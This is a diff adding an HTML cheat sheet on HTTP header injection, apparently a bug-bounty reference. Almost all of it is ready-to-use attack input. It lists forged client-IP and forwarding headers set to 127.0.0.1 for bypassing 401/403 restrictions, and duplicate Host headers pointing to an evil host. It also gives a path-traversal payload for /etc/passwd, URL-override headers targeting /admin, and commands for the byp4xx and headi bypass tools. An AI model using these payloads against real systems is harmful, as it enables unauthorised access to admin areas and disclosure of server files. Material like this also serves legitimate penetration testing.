@@ -1,0 +1,108 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="header-injections">Header injections</h1>
+<h2 id="headers">Headers</h2>
+<pre><code class="lang-bash"><span class="hljs-comment"># Add something like 127.0.0.1, localhost, 192.168.1.2, target.com or /admin, /console</span>
+<span class="hljs-attribute">Client-IP:
+Connection:
+Contact:
+Forwarded:
+From:
+Host:
+Origin:
+Referer:
+True-Client-IP:
+X-Client-IP:
+X-Custom-IP-Authorization:
+X-Forward-For:
+X-Forwarded-For:
+X-Forwarded-Host:
+X-Forwarded-Server:
+X-Host:
+X-Original-URL:
+X-Originating-IP:
+X-Real-IP:
+X-Remote-Addr:
+X-Remote-IP:
+X-Rewrite-URL:
+X-Wap-Profile:
+
+# Try to repeat same Host header 2 times
+Host</span>: legit.com
+<span class="hljs-attribute">Stuff</span>: stuff
+<span class="hljs-attribute">Host</span>: evil.com
+
+<span class="hljs-comment"># Bypass type limit</span>
+<span class="hljs-attribute">Accept</span>: application/json, text/javascript, */*; q=0.01
+<span class="hljs-attribute">Accept</span>: ../../../../../../../../../etc/passwd{{'
+
+<span class="hljs-comment"># Try to change the HTTP version from 1.1 to HTTP/0.9 and remove the host header</span>
+
+<span class="hljs-comment"># 401/403 bypasses </span>
+<span class="hljs-comment"># Whitelisted IP 127.0.0.1 or localhost</span>
+<span class="hljs-attribute">Client-IP</span>: 127.0.0.1
+<span class="hljs-attribute">Forwarded-For-Ip</span>: 127.0.0.1
+<span class="hljs-attribute">Forwarded-For</span>: 127.0.0.1
+<span class="hljs-attribute">Forwarded-For</span>: localhost
+<span class="hljs-attribute">Forwarded</span>: 127.0.0.1
+<span class="hljs-attribute">Forwarded</span>: localhost
+<span class="hljs-attribute">True-Client-IP</span>: 127.0.0.1
+<span class="hljs-attribute">X-Client-IP</span>: 127.0.0.1
+<span class="hljs-attribute">X-Custom-IP-Authorization</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forward-For</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forward</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forward</span>: localhost
+<span class="hljs-attribute">X-Forwarded-By</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forwarded-By</span>: localhost
+<span class="hljs-attribute">X-Forwarded-For-Original</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forwarded-For-Original</span>: localhost
+<span class="hljs-attribute">X-Forwarded-For</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forwarded-For</span>: localhost
+<span class="hljs-attribute">X-Forwarded-Server</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forwarded-Server</span>: localhost
+<span class="hljs-attribute">X-Forwarded</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forwarded</span>: localhost
+<span class="hljs-attribute">X-Forwared-Host</span>: 127.0.0.1
+<span class="hljs-attribute">X-Forwared-Host</span>: localhost
+<span class="hljs-attribute">X-Host</span>: 127.0.0.1
+<span class="hljs-attribute">X-Host</span>: localhost
+<span class="hljs-attribute">X-HTTP-Host-Override</span>: 127.0.0.1
+<span class="hljs-attribute">X-Originating-IP</span>: 127.0.0.1
+<span class="hljs-attribute">X-Real-IP</span>: 127.0.0.1
+<span class="hljs-attribute">X-Remote-Addr</span>: 127.0.0.1
+<span class="hljs-attribute">X-Remote-Addr</span>: localhost
+<span class="hljs-attribute">X-Remote-IP</span>: 127.0.0.1
+
+<span class="hljs-comment"># Fake Origin - make GET request to accesible endpoint with:</span>
+<span class="hljs-attribute">X-Original-URL</span>: /admin
+<span class="hljs-attribute">X-Override-URL</span>: /admin
+<span class="hljs-attribute">X-Rewrite-URL</span>: /admin
+<span class="hljs-attribute">Referer</span>: /admin
+<span class="hljs-comment"># Also try with absoulte url https:/domain.com/admin</span>
+
+<span class="hljs-comment"># Method Override</span>
+<span class="hljs-attribute">X-HTTP-Method-Override</span>: PUT
+
+<span class="hljs-comment"># Provide full path GET</span>
+<span class="hljs-attribute">GET https://vulnerable-website.com/ HTTP/1.1
+Host</span>: evil-website.com
+
+<span class="hljs-comment"># Add line wrapping</span>
+<span class="hljs-attribute">GET /index.php HTTP/1.1
+ Host</span>: vulnerable-website.com
+<span class="hljs-attribute">Host</span>: evil-website.com
+
+<span class="hljs-comment"># Wordlists</span>
+<span class="hljs-attribute">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers
+https://github.com/danielmiessler/SecLists/tree/bbb4d86ec1e234b5d3cfa0a4ab3e20c9d5006405/Miscellaneous/web/http-request-headers</span>
+</code></pre>
+<h2 id="tools">Tools</h2>
+<pre><code class="lang-bash"># http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/lobuhi/byp4xx
+./byp4xx.<span class="hljs-keyword">sh</span> http<span class="hljs-variable">s:</span>//url/path
+# http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/OdinF13/Bug-Bounty-Scripts
+
+# http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/mlcsec/headi
+headi -url http://target.<span class="hljs-keyword">com</span>/admin
+</code></pre>
+</body></html>
